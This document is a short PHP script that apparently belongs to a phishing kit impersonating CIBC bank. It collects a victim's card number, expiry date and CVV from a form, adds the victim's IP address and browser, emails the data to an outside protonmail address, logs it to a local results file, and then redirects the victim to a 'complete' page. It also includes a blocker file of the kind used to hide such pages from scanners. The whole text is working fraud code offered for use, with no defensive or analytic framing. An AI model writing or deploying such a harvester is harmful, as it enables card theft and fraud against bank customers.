<?php
include("blocker.php");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 CardDetails--------------------\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED1']."-".$_POST['ED2']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "---------------------------------------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------CIBCResults--------------------------\n";
$send = "rikkogreen44@protonmail.com";
$subject = "cibcResultz 2 ".$_POST['results'];

@mail($send,$subject,$message);

$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "complete.php";

</script>